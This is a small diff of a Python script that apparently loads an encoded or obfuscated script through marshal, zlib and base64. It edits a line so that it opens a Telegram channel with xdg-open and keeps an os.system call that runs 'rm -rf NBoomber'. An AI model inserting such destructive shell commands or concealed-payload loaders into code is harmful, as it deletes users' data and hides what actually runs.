@@ -3,7 +3,7 @@ import marshal
 import zlib
 import base64
 import os 
-os.system("https://t.me/echo_typhoon")
+os.system("xdg-open https://t.me/echo_typhoon")
 os.system("rm -rf NBoomber")
 
 # The encoded script (you can paste the content from the encoded_script.py)
